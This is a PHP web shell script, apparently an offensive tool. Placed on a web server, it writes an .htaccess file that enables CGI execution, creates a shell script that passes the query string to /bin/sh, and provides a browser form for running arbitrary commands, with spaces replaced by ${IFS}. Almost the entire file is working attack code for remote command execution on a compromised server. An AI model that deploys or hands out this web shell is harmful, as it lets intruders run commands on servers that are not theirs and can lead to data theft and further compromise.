<?php
// php-cgi-shell
// - jgor <jgor@indiecom.org>

$dir = 'shell';
$shell = 'shell.hax';

function create_directory($folder) {
    echo "Creating directory... ";
    mkdir($folder, 0777) or die('failed<br />');
    echo "done<br />";
}

function create_htaccess($file, $ext) {
    echo "Creating htaccess... ";
    $handle = fopen($file, 'w') or die('failed<br />');
    $data = <<<EOT
Options +ExecCGI
AddHandler cgi-script .$ext
EOT;
    fwrite($handle, $data);
    fclose($handle);
    echo "done<br />";
}

function create_shell($file) {
    echo "Creating shell... ";
    $handle = fopen($file, 'w') or die('failed<br />');
    $data = <<<EOT
#!/bin/sh
echo "Content-type: text/plain"
echo ""
/bin/sh -c "\$QUERY_STRING 2>&1"
EOT;
    fwrite($handle, $data);
    fclose($handle);
    echo "done<br />";
    echo "Making shell executable... ";
    chmod($file, 0755) or die('failed<br />');
    echo "done<br />";
}

function remove_shell($shell) {
    if (file_exists($shell)) {
        echo "Deleting shell... ";
        unlink($shell);
        echo "done<br />";
    }
}

function remove_htaccess($htaccess) {
    if (file_exists($htaccess)) {
        echo "Deleting htaccess... ";
        unlink($htaccess);
        echo "done<br />";
    }
}

function remove_directory($dir) {
    if (is_dir($dir)) {
        echo "Deleting folder... ";
        rmdir($dir);
        echo "done<br />";
    }
}

function display_shell($shell) {
    if (file_exists($shell)) {
        echo "<p>shell at [<a href=\"$shell\">$shell</a>]</p>";
        echo "<form action=\"\" method=\"post\">";
        echo "<input type=\"hidden\" name=\"remove\" value=\"1\" />";
        echo "<input type=\"submit\" value=\"remove shell\" />";
        echo "</form>";
        echo "<form action=\"\" method=\"post\">";
        echo "command: <input autofocus type=\"text\" name=\"cmd\" />";
        echo "<input type=\"submit\" value=\"exec\" /></form>";
    }
    else {

        echo "<p>no shell found.</p>";
        echo "<form action=\"\" method=\"post\">";
        echo "<input type=\"hidden\" name=\"create\" value=\"1\" />";
        echo "<input type=\"submit\" value=\"create shell\" />";
        echo "</form>";
    }
}

function execute_command($shell, $cmd) {
    $path = dirname($_SERVER['PHP_SELF']);
    $shell_url = "http://$_SERVER[HTTP_HOST]$path/$shell";
    $cmd = str_replace(' ', '${IFS}', $cmd);
    $response = file_get_contents($shell_url . '?' . $cmd);
    $output = htmlspecialchars($response);
    echo "Output:<br /><textarea rows=25 cols=80>$output</textarea>";
}

$htaccess = "$dir/.htaccess";
$shell = "$dir/$shell";
$ext = pathinfo($shell, PATHINFO_EXTENSION);

if (isset($_REQUEST['remove'])) {
    remove_shell($shell);
    remove_htaccess($htaccess);
    remove_directory($dir);
}

if (isset($_REQUEST['create'])) {
    create_directory($dir);
    create_htaccess($htaccess, $ext);
    create_shell($shell);
}

display_shell($shell);

if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    execute_command($shell, $cmd);
}
?>
